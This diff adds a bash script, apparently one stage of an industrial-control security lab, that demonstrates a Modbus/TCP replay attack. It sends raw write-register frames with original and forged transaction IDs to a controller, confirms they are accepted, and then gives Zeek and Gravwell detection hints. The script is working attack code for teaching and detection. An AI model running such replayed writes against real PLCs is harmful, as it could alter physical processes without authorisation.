@@ -1,0 +1,143 @@
+#!/usr/bin/env bash
+# Stage 3 — Modbus Replay Attack (M6)
+#
+# WHAT THIS DEMONSTRATES:
+#   The Modbus/TCP MBAP header includes a Transaction ID (TID) field, which
+#   looks like it could prevent replay attacks. It doesn't. The TID exists so
+#   the client can match responses to requests over a multiplexed TCP session —
+#   the server just echoes it back. There is no monotonic counter, no nonce,
+#   no timestamp. A PDU captured today is valid tomorrow, next week, forever.
+#
+#   This attack simulates an attacker who sniffed one legitimate write from the
+#   operator (easy on a flat OT network with no encryption) and replays it
+#   verbatim. The outstation accepts it without question.
+#
+# MITRE ATT&CK (ICS): T0856 Spoof Reporting Message, T0855 Unauthorized Command Message
+#
+# ZEEK VISIBILITY:
+#   modbus.log — writes from attacker IP; TID field logged, mismatch detectable
+set -euo pipefail
+
+CONTROLLER="${CONTROLLER:-controller}"
+PORT="${PORT:-5020}"
+
+echo "=== [modbus-replay] Stage 3: Replay attack — no replay protection ==="
+echo ""
+echo "  The Modbus spec (Application Protocol v1.1b3) defines a Transaction ID"
+echo "  in the MBAP header, but it is purely an echo field — the server sends"
+echo "  back whatever TID the client sent. There is no validation, no sequence"
+echo "  enforcement, no expiry. A packet sniffed off the wire years ago works today."
+echo ""
+
+echo "--- What a legitimate write looks like on the wire ---"
+echo "  Modbus/TCP frame layout (12 bytes minimum):"
+echo ""
+echo "    Bytes 0-1: Transaction ID  (client picks any value; server echoes it)"
+echo "    Bytes 2-3: Protocol ID     (always 0x0000 for Modbus)"
+echo "    Bytes 4-5: Length          (number of bytes that follow)"
+echo "    Byte  6:   Unit ID         (device address, 1 in our case)"
+echo "    Byte  7:   Function code   (0x06 = Write Single Register)"
+echo "    Bytes 8-9: Register address (0x0000 = HR 0, the motor power)"
+echo "    Bytes 10-11: Value         (0x001E = 30 decimal)"
+echo ""
+
+echo "--- Step 1: Send a real write first (power=30) so Zeek has a baseline ---"
+python3 - <<'PY'
+import asyncio, os
+from pymodbus.client import AsyncModbusTcpClient
+async def go():
+    c = AsyncModbusTcpClient(os.environ.get("CONTROLLER","controller"),
+                             port=int(os.environ.get("PORT","5020")))
+    await c.connect()
+    await c.write_register(0, 30)
+    rr = await c.read_holding_registers(0, count=1)
+    print(f"  Legitimate write: HR[0] = {rr.registers[0]}")
+    c.close()
+asyncio.run(go())
+PY
+echo ""
+
+sleep 1
+
+echo "--- Step 2: Replay the exact same PDU bytes raw over TCP ---"
+echo "  TID=0x0001, FC=0x06, addr=0x0000, value=0x001e (30)"
+echo "  This is a byte-for-byte copy of what a sniffed pcap would contain."
+echo "  We send it with ncat — no Modbus library, just raw bytes over a TCP socket."
+
+# FC 6 Write Single Register: TID=0x0001, Proto=0x0000, Len=0x0006, Unit=0x01
+# FC=0x06, Addr=0x0000, Value=0x001e (30)
+REPLAY_PDU='\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x00\x1e'
+python3 - <<'PY'
+import socket, os
+host = os.environ.get("CONTROLLER","controller")
+port = int(os.environ.get("PORT","5020"))
+payload = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x00\x1e'
+s = socket.create_connection((host, port), timeout=3)
+s.sendall(payload)
+resp = s.recv(256)
+s.close()
+if len(resp) >= 12:
+    tid = int.from_bytes(resp[0:2], "big")
+    fc  = resp[7]
+    val = int.from_bytes(resp[10:12], "big")
+    print(f"  Server response: TID={hex(tid)} FC={hex(fc)} value={val}")
+    print(f"  -> Replay accepted. Server echoed TID=0x0001 back unchanged.")
+else:
+    print(f"  Response ({len(resp)} bytes): {resp.hex()}")
+PY
+echo ""
+
+sleep 1
+
+echo "--- Step 3: Replay with a completely wrong TID (0x9999) ---"
+echo "  TID=0x9999 is far out of sequence. A secure protocol would reject this."
+echo "  Modbus doesn't care — it echoes whatever TID you send."
+
+python3 - <<'PY'
+import socket, os
+host = os.environ.get("CONTROLLER","controller")
+port = int(os.environ.get("PORT","5020"))
+payload = b'\x99\x99\x00\x00\x00\x06\x01\x06\x00\x00\x00\x1e'
+s = socket.create_connection((host, port), timeout=3)
+s.sendall(payload)
+resp = s.recv(256)
+s.close()
+if len(resp) >= 12:
+    tid = int.from_bytes(resp[0:2], "big")
+    val = int.from_bytes(resp[10:12], "big")
+    print(f"  Server response: TID={hex(tid)} value={val}")
+    print(f"  -> Out-of-sequence TID=0x9999 accepted without complaint. No validation.")
+else:
+    print(f"  Response ({len(resp)} bytes): {resp.hex()}")
+PY
+echo ""
+
+echo "--- Step 4: Confirm value is still in the register ---"
+python3 - <<'PY'
+import asyncio, os
+from pymodbus.client import AsyncModbusTcpClient
+async def go():
+    c = AsyncModbusTcpClient(os.environ.get("CONTROLLER","controller"),
+                             port=int(os.environ.get("PORT","5020")))
+    await c.connect()
+    rr = await c.read_holding_registers(0, count=1)
+    print(f"  HR[0] = {rr.registers[0]}  (replayed value accepted and stored)")
+    await c.write_register(0, 0)
+    print("  Reset HR[0] to 0")
+    c.close()
+asyncio.run(go())
+PY
+
+echo ""
+echo "[modbus-replay] Done."
+echo ""
+echo "  The real-world implication: an attacker on the same OT network segment"
+echo "  can capture one operator write with tcpdump, then replay it at will —"
+echo "  during a shift change, during an alarm condition, or to cause a hard-to-"
+echo "  explain intermittent fault. The PLC has no way to know it wasn't the HMI."
+echo ""
+echo "Gravwell query to see replay artifacts:"
+echo "  tag=zeek grep \"\\\"_path\\\":\\\"modbus\\\"\" grep \"WRITE\" | json \"id.orig_h\" func tid | table tid \"id.orig_h\" func"
+echo ""
+echo "Key detection signal: writes from attacker IP, or writes with TID values"
+echo "  far outside the sequential range expected from the legitimate HMI."
